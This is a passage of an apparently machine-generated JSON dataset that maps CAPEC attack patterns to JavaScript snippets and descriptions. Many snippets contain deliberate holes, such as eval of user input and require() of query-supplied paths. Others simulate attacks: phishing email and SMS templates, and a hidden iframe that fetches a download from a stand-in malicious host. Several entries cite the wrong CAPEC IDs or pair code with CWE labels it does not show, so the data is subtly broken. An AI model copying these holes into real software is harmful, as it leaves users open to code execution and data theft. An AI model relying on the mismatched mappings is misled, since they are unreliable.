        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to read a configuration file from a common resource location\nfunction readConfigFile() {\n  const configPath = path.join('/etc', 'config.json');\n  try {\n    const data = fs.readFileSync(configPath, 'utf8');\n    console.log('Config Data:', data);\n  } catch (err) {\n    console.error('Error reading config file:', err);\n  }\n}\n\n// Function to simulate improper zeroization of sensitive data\nfunction improperZeroization() {\n  let sensitiveData = 'Sensitive Information';\n  console.log('Sensitive Data:', sensitiveData);\n  // Improperly zeroize sensitive data\n  sensitiveData = null;\n  console.log('Data after zeroization:', sensitiveData);\n}\n\n// Function to simulate exposure of sensitive system information\nfunction exposeSensitiveInfo() {\n  const debugInfo = 'Debug Mode: ON, Key: 12345';\n  console.log('Debug Info:', debugInfo);\n}\n\n// Execute functions\nreadConfigFile();\nimproperZeroization();\nexposeSensitiveInfo();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Collect Data from Common Resource Locations' by attempting to read a configuration file from a well-known directory (/etc/config.json). The code also includes examples of related CWEs: improper zeroization of sensitive data and exposure of sensitive system information. The 'readConfigFile' function tries to read a configuration file from a common resource location, which could be exploited by an adversary if the file contains sensitive information. The 'improperZeroization' function shows how sensitive data might not be properly cleared, leaving it vulnerable. The 'exposeSensitiveInfo' function simulates the exposure of sensitive information during a debug mode, which could be exploited by an attacker."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "const users = { 'admin': 'password123' }; \n\nfunction login(username, password) { \n  if (users[username] && users[username] === password) { \n    console.log('Login successful!'); \n    return true; \n  } else { \n    console.log('Login failed!'); \n    return false; \n  } \n} \n\n// Simulating an identity spoofing attack \nconst spoofedUsername = 'admin'; \nconst spoofedPassword = 'password123'; \nlogin(spoofedUsername, spoofedPassword);",
        "description": "This JavaScript code snippet demonstrates a simple login function that checks a hardcoded username and password. The 'users' object stores user credentials, and the 'login' function verifies the provided username and password against this object. The code is vulnerable to identity spoofing because it uses weak authentication (CWE-1390) and does not properly verify the identity of the user (CWE-287). An attacker can easily spoof the identity by providing the correct username and password, as shown in the simulated attack where 'admin' and 'password123' are used to gain access. This example highlights the importance of implementing robust authentication mechanisms to prevent identity spoofing attacks."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "function processUserInput(input) {\n    // CWE-20: Improper Input Validation\n    if (typeof input !== 'string') {\n        throw new Error('Invalid input type');\n    }\n\n    // CWE-1286: Improper Validation of Syntactic Correctness of Input\n    if (!/^[a-zA-Z0-9]+$/.test(input)) {\n        throw new Error('Input contains invalid characters');\n    }\n\n    // CWE-1287: Improper Validation of Specified Type of Input\n    if (input.length > 100) {\n        throw new Error('Input is too long');\n    }\n\n    // CWE-807: Reliance on Untrusted Inputs in a Security Decision\n    if (input === 'admin') {\n        console.log('Admin access granted');\n    } else {\n        console.log('User access granted');\n    }\n}\n\n// Example usage\ntry {\n    processUserInput('admin');\n} catch (e) {\n    console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a function `processUserInput` that processes user input with several layers of validation. The function checks if the input is a string (CWE-20), ensures the input contains only alphanumeric characters (CWE-1286), and verifies the input length does not exceed 100 characters (CWE-1287). Despite these validations, the function still makes a security decision based on the untrusted input value (CWE-807), granting 'admin' access if the input is 'admin'. This represents the main idea of CAPEC-176: Input Data Manipulation, where an attacker could potentially manipulate the input to bypass security mechanisms."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "const fetchResource = (url) => {\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const trustedDomain = 'https://trusted.example.com';\n  if (!url.startsWith(trustedDomain)) {\n    console.error('Untrusted resource location!');\n    return;\n  }\n  fetch(url)\n    .then(response => {\n      if (!response.ok) {\n        throw new Error('Network response was not ok');\n      }\n      return response.text();\n    })\n    .then(data => {\n      // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n      document.getElementById('content').innerHTML = data;\n    })\n    .catch(error => {\n      console.error('Fetch error:', error);\n    });\n};\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nconst userInputUrl = 'https://malicious.example.com/resource';\nfetchResource(userInputUrl);",
        "description": "This JavaScript code snippet demonstrates a scenario where an application fetches a resource from a URL provided by the user. The function `fetchResource` checks if the URL starts with a trusted domain to prevent resource location spoofing (CAPEC-111). If the URL is not trusted, it logs an error and returns. If the URL is trusted, it fetches the resource and updates the UI with the fetched data. This example highlights several CWEs: CWE-941 (Incorrectly Specified Destination in a Communication Channel) by ensuring the URL is from a trusted domain, CWE-451 (User Interface Misrepresentation of Critical Information) by updating the UI with fetched data, and CWE-940 (Improper Verification of Source of a Communication Channel) by demonstrating the potential risk of using user-provided URLs without proper verification."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to create a temporary file with sensitive information\nfunction createTempFile(data) {\n  const tempDir = path.join(__dirname, 'temp');\n  const tempFilePath = path.join(tempDir, 'tempfile.txt');\n\n  // Ensure the temp directory exists\n  if (!fs.existsSync(tempDir)) {\n    fs.mkdirSync(tempDir);\n  }\n\n  // Write sensitive data to the temporary file\n  fs.writeFileSync(tempFilePath, data);\n\n  console.log('Temporary file created at:', tempFilePath);\n}\n\n// Example usage\nconst sensitiveData = 'User password: 12345';\ncreateTempFile(sensitiveData);",
        "description": "This JavaScript code snippet demonstrates the creation of a temporary file that stores sensitive information, embodying the main idea of the CAPEC 'Screen Temporary Files for Sensitive Information'. The code creates a temporary directory and writes sensitive data to a file within that directory. This example highlights several related CWEs: CWE-377 (Insecure Temporary File), CWE-524 (Use of Cache Containing Sensitive Information), CWE-379 (Creation of Temporary File in Directory with Insecure Permissions), and CWE-378 (Creation of Temporary File With Insecure Permissions). The temporary file is created without any security measures, making it vulnerable to unauthorized access and exploitation."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString(); // Cleartext transmission of sensitive information (CWE-319)\n    });\n    req.on('end', () => {\n      const credentials = JSON.parse(body);\n      // Missing encryption of sensitive data (CWE-311)\n      console.log(`Username: ${credentials.username}, Password: ${credentials.password}`);\n      res.end('Login data received');\n    });\n  } else {\n    res.end('Hello World');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server is listening on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js that listens for POST requests to the '/login' endpoint. When a request is received, it reads the data in cleartext (CWE-319) and logs the username and password to the console without any encryption (CWE-311). This represents a sniffing attack scenario where sensitive information is transmitted in cleartext and can be intercepted by an adversary. The code demonstrates the vulnerability of transmitting sensitive data without encryption, making it susceptible to sniffing attacks as described in the CAPEC."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString(); // Vulnerable: sensitive data in cleartext\n    });\n    req.on('end', () => {\n      console.log('Received login data:', body); // Vulnerable: logging sensitive data\n      res.end('Login data received');\n    });\n  } else {\n    res.end('Hello World');\n  }\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/login' endpoint. When such a request is received, it collects the data in cleartext and logs it to the console. This embodies the CAPEC 'Sniffing Network Traffic' by demonstrating how sensitive information (e.g., login credentials) can be transmitted in cleartext (CWE-319) and logged without encryption (CWE-311), making it susceptible to network sniffing attacks. The code also highlights the risk of exposing sensitive information to unauthorized actors (CWE-497)."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// User input for library path\nlet userLibraryPath = process.argv[2];\n\n// Validate the user input (insecure validation)\nif (!userLibraryPath) {\n  console.error('Library path is required');\n  process.exit(1);\n}\n\n// Construct the full path to the library\nlet libraryPath = path.join(__dirname, userLibraryPath);\n\n// Load the library (potentially malicious)\ntry {\n  let library = require(libraryPath);\n  library.execute();\n} catch (err) {\n  console.error('Failed to load library:', err);\n}\n",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an application loads an external library based on user input without proper validation or control. The user provides a path to the library, which is then concatenated with the current directory path and loaded using `require()`. This can lead to an attacker supplying a malicious library path, causing the application to execute unauthorized code. This example embodies the CAPEC 'Redirect Access to Libraries' and is related to CWEs such as 'Untrusted Search Path' (CWE-426) and 'External Control of File Name or Path' (CWE-73)."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/execute', (req, res) => {\n  const userScript = req.body.script;\n  try {\n    const result = eval(userScript);\n    res.send(`Result: ${result}`);\n  } catch (e) {\n    res.status(500).send('Error executing script');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server that listens for POST requests on the '/execute' endpoint. The server expects a 'script' parameter in the request body, which it then executes using the 'eval' function. This embodies the main idea of the CAPEC 'Exploit Script-Based APIs' by allowing user-provided scripts to be executed on the server. This is highly vulnerable as it does not validate or sanitize the input, leading to potential security issues such as arbitrary code execution. The related CWEs highlight the risks of improper input neutralization and origin validation, which are evident in this example."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'bank.example.com',\n  port: 80,\n  path: '/login',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Vulnerable: No validation of the endpoint, could be redirected to a malicious server\nreq.write('username=attacker&password=1234');\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP POST request to a bank's login endpoint. The code is vulnerable to infrastructure manipulation attacks, such as DNS spoofing or pharming, because it does not validate the endpoint it is communicating with. This could allow an attacker to redirect the request to a malicious server, capturing sensitive information like usernames and passwords. The code also lacks proper message integrity checks, making it susceptible to tampering during transmission. This example embodies the main idea of CAPEC-225 (Infrastructure Manipulation) and highlights related weaknesses such as CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<body>\n\n<form action=\"/purchase\" method=\"POST\">\n  <input type=\"hidden\" name=\"item_id\" value=\"12345\">\n  <input type=\"hidden\" name=\"price\" value=\"100\">\n  <input type=\"hidden\" name=\"quantity\" value=\"1\">\n  <input type=\"submit\" value=\"Buy Now\">\n</form>\n\n<script>\n  // Simulating an attacker modifying the hidden fields\n  document.querySelector('input[name=\"price\"]').value = '1'; // Change price to $1\n  document.querySelector('input[name=\"quantity\"]').value = '10'; // Change quantity to 10\n</script>\n\n</body>\n</html>",
        "description": "This JavaScript code snippet represents a vulnerable e-commerce form where hidden fields are used to store sensitive information such as item price and quantity. The form submits this data to the server for processing. The script demonstrates how an attacker can manipulate these hidden fields to change the price and quantity before submission, exploiting the server's trust in client-side data. This embodies the CAPEC 'Manipulating Hidden Fields' and highlights related CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602), 'Reliance on Untrusted Inputs in a Security Decision' (CWE-807), and 'External Control of Assumed-Immutable Web Parameter' (CWE-472)."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "const trustedDomain = 'https://trusted.example.com';\nconst userEmail = 'user@example.com';\n\nfunction sendPhishingEmail(targetEmail) {\n  const phishingLink = `https://malicious.example.com?redirect=${encodeURIComponent(trustedDomain)}`;\n  const emailContent = `Dear ${targetEmail},\n\nWe noticed unusual activity on your account. Please verify your information by clicking the link below:\n\n<a href=\"${phishingLink}\" target=\"_blank\">Verify Now</a>\n\nThank you,\nTrusted Support Team`;\n  console.log(`Sending email to ${targetEmail}:\n${emailContent}`);\n}\n\nsendPhishingEmail(userEmail);",
        "description": "This JavaScript code snippet simulates a spear phishing attack by sending a targeted email to a specific user. The email appears to come from a trusted entity and contains a link that redirects the user to a malicious site. The link uses URL redirection (CWE-601) to make the phishing attempt more convincing. The email content is personalized with the target's email address to increase the likelihood of the user clicking the link. This code embodies the main idea of CAPEC-98 (Phishing) and CAPEC-163 (Spear Phishing) by demonstrating how an attacker can craft a deceptive email to trick a user into visiting a compromised site."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "const sendPhishingSMS = (phoneNumber) => {\n  const phishingLink = 'http://malicious-site.com';\n  const message = `Your account has been compromised. Please visit ${phishingLink} to secure your account.`;\n  // Simulate sending SMS\n  console.log(`Sending SMS to ${phoneNumber}: ${message}`);\n};\n\nconst handleUserInput = (input) => {\n  // Simulate user visiting the phishing link and entering credentials\n  const credentials = { username: 'user', password: input };\n  console.log('Captured credentials:', credentials);\n};\n\n// Example usage\nsendPhishingSMS('+1234567890');\nhandleUserInput('password123');",
        "description": "This JavaScript code snippet simulates a mobile phishing attack. The `sendPhishingSMS` function sends a phishing SMS to a given phone number, enticing the user to visit a malicious link. The `handleUserInput` function simulates the user entering their credentials on the phishing site, capturing the username and password. This code embodies the main idea of the CAPEC by demonstrating how an attacker might initiate a phishing attack via SMS and capture sensitive information. The related CWEs are represented by the spoofed message (CWE-451), the potential for authentication bypass (CWE-290), and the use of passwords (CWE-309, CWE-308)."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction handleFileUpload(filePath, fileContent) {\n  // CWE-22: Path Traversal\n  const baseDir = '/var/www/uploads';\n  const safePath = path.join(baseDir, filePath);\n  if (!safePath.startsWith(baseDir)) {\n    throw new Error('Invalid file path');\n  }\n\n  // CWE-73: External Control of File Name or Path\n  fs.writeFile(safePath, fileContent, (err) => {\n    if (err) throw err;\n    console.log('File saved!');\n  });\n\n  // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n  if (path.extname(safePath) === '.exe') {\n    throw new Error('Executable files are not allowed');\n  }\n\n  // CWE-377: Insecure Temporary File\n  const tempFilePath = path.join(baseDir, 'temp', path.basename(safePath));\n  fs.writeFile(tempFilePath, fileContent, (err) => {\n    if (err) throw err;\n    console.log('Temporary file saved!');\n  });\n}\n\n// Example usage\ntry {\n  handleFileUpload('../etc/passwd', 'malicious content');\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a file upload handler that embodies the main idea of the CAPEC 'File Manipulation' attack. The code addresses several related CWEs to highlight potential vulnerabilities:\n\n1. **CWE-22: Path Traversal** - The code ensures that the file path is within a restricted directory by checking if the resolved path starts with the base directory.\n2. **CWE-73: External Control of File Name or Path** - The code allows user input to control the file path and name, which is then used in filesystem operations.\n3. **CWE-646: Reliance on File Name or Extension of Externally-Supplied File** - The code checks the file extension to prevent the upload of executable files.\n4. **CWE-377: Insecure Temporary File** - The code creates a temporary file in a subdirectory, which could be insecure if not properly managed.\n\nThe example usage at the end demonstrates an attempt to upload a file with a path traversal attack, which is caught and handled by the code."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "const systemConfig = { secureMode: true, userRole: 'admin' }; \n\nfunction resetSystem() { \n  // Missing authentication for critical function (CWE-306) \n  systemConfig.secureMode = false; \n  systemConfig.userRole = 'guest'; \n  console.log('System reset to default values.'); \n} \n\nfunction simulatePowerCycle() { \n  // Improper lock behavior after power state transition (CWE-1232) \n  resetSystem(); \n  console.log('Power cycle complete.'); \n} \n\n// Simulate an attacker triggering a power cycle \nsimulatePowerCycle(); \n\nconsole.log('Current system configuration:', systemConfig);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can force the system to reset its values to a previous state, leveraging potential weaknesses in the system's configuration. The `resetSystem` function resets critical security settings without any authentication (CWE-306). The `simulatePowerCycle` function simulates a power cycle, which improperly allows the system configuration to be changed (CWE-1232). This represents the CAPEC concept of forcing the system to reset values to exploit state-dependent weaknesses."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "const sensitiveData = 'SecretKey123';\n\nfunction logSensitiveData() {\n  console.log('Sensitive Data:', sensitiveData);\n}\n\nfunction debugMode() {\n  if (process.env.DEBUG === 'true') {\n    logSensitiveData();\n  }\n}\n\ndebugMode();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data ('SecretKey123') is exposed through a debug mode. The `logSensitiveData` function logs the sensitive data to the console. The `debugMode` function checks if the environment variable `DEBUG` is set to 'true', and if so, it calls `logSensitiveData`. This represents the CAPEC concept of White Box Reverse Engineering, where an attacker can discover sensitive information through analysis techniques. The related CWEs are illustrated as follows: CWE-1323 (Improper Management of Sensitive Trace Data) is shown by logging sensitive data; CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is demonstrated by exposing sensitive data through an environment variable; CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime) is represented by the debug mode that can be activated at runtime."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to create a file with an ADS\nfunction createFileWithADS(filePath, streamName, data) {\n  const adsPath = `${filePath}:${streamName}`;\n  fs.writeFileSync(adsPath, data);\n  console.log(`ADS created at ${adsPath}`);\n}\n\n// Function to read data from an ADS\nfunction readADS(filePath, streamName) {\n  const adsPath = `${filePath}:${streamName}`;\n  if (fs.existsSync(adsPath)) {\n    const data = fs.readFileSync(adsPath, 'utf8');\n    console.log(`Data from ADS: ${data}`);\n  } else {\n    console.log('ADS not found');\n  }\n}\n\n// Example usage\nconst filePath = path.join(__dirname, 'example.txt');\nconst streamName = 'hiddenStream';\nconst data = 'Sensitive data hidden in ADS';\n\n// Create a file and add an ADS\nfs.writeFileSync(filePath, 'This is a normal file content');\ncreateFileWithADS(filePath, streamName, data);\n\n// Read data from the ADS\nreadADS(filePath, streamName);",
        "description": "This JavaScript code snippet demonstrates how to create and read an Alternate Data Stream (ADS) in a file on an NTFS filesystem. The `createFileWithADS` function creates an ADS by appending `:streamName` to the file path and writing data to it. The `readADS` function reads data from the specified ADS if it exists. This code embodies the main idea of CAPEC-180, which involves exploiting NTFS ADS to hide data. The related CWEs are represented by the improper handling of sensitive information (CWE-212) and the improper handling of ADS (CWE-69), as the code shows how sensitive data can be hidden in an ADS, potentially evading detection by normal system utilities and some antivirus programs."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst sensitiveData = 'Sensitive Information';\n\napp.get('/data', (req, res) => {\n  if (req.query.auth === 'true') {\n    res.send(sensitiveData);\n  } else {\n    res.send('Unauthorized');\n  }\n});\n\napp.get('/status', (req, res) => {\n  if (req.query.auth === 'true') {\n    res.send('Server is running');\n  } else {\n    res.send('Error');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with two endpoints: '/data' and '/status'. The '/data' endpoint exposes sensitive information if the 'auth' query parameter is set to 'true', otherwise it returns 'Unauthorized'. The '/status' endpoint returns 'Server is running' if 'auth' is 'true', otherwise it returns 'Error'. This code demonstrates the concept of 'Footprinting' by allowing an adversary to probe the server and observe behavioral discrepancies based on the 'auth' parameter. The '/status' endpoint's different responses can reveal the server's internal state, aligning with CWE-205 and CWE-207. Additionally, the exposure of sensitive data without proper authorization checks aligns with CWE-200."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/?query=sensitiveData',\n  method: 'GET',\n  headers: {\n    'User-Agent': 'Mozilla/5.0'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Response Headers:', res.headers);\n    console.log('Response Body:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP GET request to a web application, which is a common method used in web application fingerprinting. The request includes a sensitive query string, which is a vulnerability (CWE-598). The response headers and body are logged, potentially exposing sensitive system information (CWE-497, CWE-209). This information can help an attacker identify the web application's software version, error pages, and other details, which can be used to plan further attacks. The code represents the main idea of CAPEC-170 by showing how an attacker might probe a web application to gather information."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "const userInput = 'userInput';\nconst dynamicVarName = eval(userInput);\n\nfunction processData() {\n  var sensitiveData = 'secret';\n  console.log(dynamicVarName);\n}\n\nprocessData();",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the deprecated CAPEC 'Variable Manipulation' and its related CWEs. The code takes a user-controlled input 'userInput' and uses the 'eval' function to dynamically evaluate it, which can lead to 'Eval Injection' (CWE-95). The variable 'sensitiveData' is declared within the 'processData' function but is not properly protected, potentially allowing an attacker to manipulate the variable name and access sensitive data (CWE-627, CWE-914). The 'dynamicVarName' is evaluated at runtime, which can lead to improper control of dynamically-identified variables (CWE-914) and dynamically-managed code resources (CWE-913). This code snippet highlights the risks of using 'eval' with user input and the importance of controlling variable scope and names."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "document.getElementById('submitButton').addEventListener('click', function() {\n  var hiddenFrame = document.createElement('iframe');\n  hiddenFrame.style.display = 'none';\n  hiddenFrame.src = 'http://malicious-site.com/download';\n  document.body.appendChild(hiddenFrame);\n});",
        "description": "This JavaScript code snippet demonstrates an action spoofing attack. When a user clicks on a button with the ID 'submitButton', they expect to submit a form or perform a benign action. However, the code creates a hidden iframe that initiates a request to 'http://malicious-site.com/download', which could trigger a download of malicious software. This embodies the main idea of CAPEC-139 (Action Spoofing) by disguising one action (form submission) as another (malicious download). The code also touches on CWE-451 (UI Misrepresentation of Critical Information) by misleading the user about the action they are performing."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "const flashVars = new URLSearchParams(window.location.search);\nconst flashParam = flashVars.get('flashParam');\n\nif (flashParam) {\n  const flashObject = document.createElement('embed');\n  flashObject.setAttribute('src', 'vulnerable.swf');\n  flashObject.setAttribute('flashvars', `param=${flashParam}`);\n  document.body.appendChild(flashObject);\n}",
        "description": "This JavaScript code snippet demonstrates a Flash Parameter Injection vulnerability. It extracts a parameter from the URL query string and injects it into a Flash object embedded within an HTML document. The code does not validate or sanitize the input, allowing an attacker to inject malicious global parameters into the Flash file. This can lead to various security issues, such as cross-site scripting (XSS) or unauthorized access to the embedding HTML document. The related CWEs provide additional context, highlighting the risks of improper data validation, permissive cross-domain policies, and the handling of dangerous file types."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const scriptUrl = queryObject.script;\n\n  if (scriptUrl) {\n    try {\n      const script = require(scriptUrl);\n      script.execute();\n    } catch (e) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Error loading script');\n    }\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No script URL provided');\n  }\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the query parameters to extract a 'script' URL, which is then dynamically required and executed. This embodies the main idea of CAPEC-242 (Code Inclusion) by allowing the inclusion of code from an external source. The code is vulnerable to CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it imports executable functionality from an untrusted source. It also touches on CWE-98 (PHP Remote File Inclusion) by not properly restricting the input used in the require function, and CWE-913 (Improper Control of Dynamically-Managed Code Resources) by not properly managing the dynamically included script."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "const fs = require('fs');\n\n// Path to the configuration file\nconst configFilePath = '/path/to/config.json';\n\n// Function to read and parse the configuration file\nfunction readConfig() {\n  try {\n    const configData = fs.readFileSync(configFilePath, 'utf8');\n    const config = JSON.parse(configData);\n    return config;\n  } catch (err) {\n    console.error('Error reading configuration file:', err);\n    return null;\n  }\n}\n\n// Function to modify a configuration setting\nfunction modifyConfigSetting(key, value) {\n  const config = readConfig();\n  if (config) {\n    config[key] = value;\n    try {\n      fs.writeFileSync(configFilePath, JSON.stringify(config, null, 2));\n      console.log('Configuration updated successfully.');\n    } catch (err) {\n      console.error('Error writing configuration file:', err);\n    }\n  }\n}\n\n// Example usage: Modify a configuration setting\nmodifyConfigSetting('settingKey', 'newValue');",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to Configuration/Environment Manipulation (CAPEC-15). The code reads and modifies an external configuration file, which can be exploited if an attacker gains access to the file system. The `readConfig` function reads and parses the configuration file, while the `modifyConfigSetting` function updates a specific configuration setting and writes it back to the file. This represents CWE-15 (External Control of System or Configuration Setting) as it allows external control over the application's configuration. If the configuration file is not properly secured, an attacker could manipulate it to alter the application's behavior."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadConfig(configName) {\n  const directories = ['/etc/app/', './config/'];\n  let configPath;\n\n  for (const dir of directories) {\n    const potentialPath = path.join(dir, configName);\n    if (fs.existsSync(potentialPath)) {\n      configPath = potentialPath;\n      break;\n    }\n  }\n\n  if (!configPath) {\n    throw new Error('Configuration file not found');\n  }\n\n  const config = fs.readFileSync(configPath, 'utf8');\n  return JSON.parse(config);\n}\n\n// Usage\ntry {\n  const config = loadConfig('appConfig.json');\n  console.log('Config loaded:', config);\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability where an attacker can exploit the file location algorithm to load a malicious configuration file. The `loadConfig` function searches for a configuration file named `configName` in two directories: `/etc/app/` and `./config/`. If an attacker places a malicious file named `appConfig.json` in the `./config/` directory, it will be loaded instead of the legitimate file in `/etc/app/`. This embodies the CAPEC idea of creating files with the same name as protected files and placing them in directories that are searched first. The related CWEs are represented by the reliance on file names and paths, and the potential for external control over these paths."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "var flashUrl = 'http://trustedsite.com/flash.swf?redirect=' + encodeURIComponent('http://untrustedsite.com/malicious.swf');\nvar flashObject = '<object type=\"application/x-shockwave-flash\" data=\"' + flashUrl + '\"></object>';\ndocument.body.innerHTML = flashObject;",
        "description": "This JavaScript code snippet demonstrates a Cross-Site Flashing attack. It constructs a URL to a trusted Flash SWF file but appends a user-controlled parameter that redirects to an untrusted, potentially malicious SWF file. The Flash object is then embedded into the web page. This attack leverages CWE-601 (Open Redirect) by redirecting to an untrusted site, CWE-942 (Permissive Cross-domain Policy) by potentially allowing cross-domain requests, and CWE-79 (Cross-site Scripting) by injecting the Flash object into the web page. The code represents the main idea of CAPEC-58, where an attacker can trick a victim into executing a Flash document that references external URLs, leading to the execution of arbitrary content."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "const fetchSensitiveData = async () => {\n  const response = await fetch('https://example.com/api/getSensitiveData?id=12345');\n  if (response.ok) {\n    const data = await response.json();\n    document.getElementById('sensitiveInfo').innerText = data.info;\n  }\n};\n\nfetchSensitiveData();\n\n// Storing sensitive data in a cookie\ndocument.cookie = 'sessionToken=abc123; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/';\n\n// Exposing raw content\nfetch('/rawContent.txt')\n  .then(response => response.text())\n  .then(text => console.log(text));",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Calling Micro-Services Directly' and the associated CWEs. The function 'fetchSensitiveData' makes a GET request to a micro-service endpoint with a sensitive query string (CWE-598). The response is then used to update a portion of the web page, which could expose sensitive information if the endpoint is not properly secured (CWE-602). Additionally, the code stores a session token in a persistent cookie (CWE-539), which is a security risk if the cookie contains sensitive information. Lastly, the code fetches and logs raw content from a file stored under the web root (CWE-433), which could expose sensitive data if the file is not properly protected (CWE-219)."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check user role\nfunction checkUserRole(req, res, next) {\n  if (req.user && req.user.role === 'admin') {\n    next();\n  } else {\n    res.status(403).send('Forbidden');\n  }\n}\n\n// Incorrectly configured access control\napp.get('/admin', (req, res) => {\n  // Missing checkUserRole middleware\n  res.send('Welcome to the admin panel');\n});\n\n// Correctly configured access control\napp.get('/secure-admin', checkUserRole, (req, res) => {\n  res.send('Welcome to the secure admin panel');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
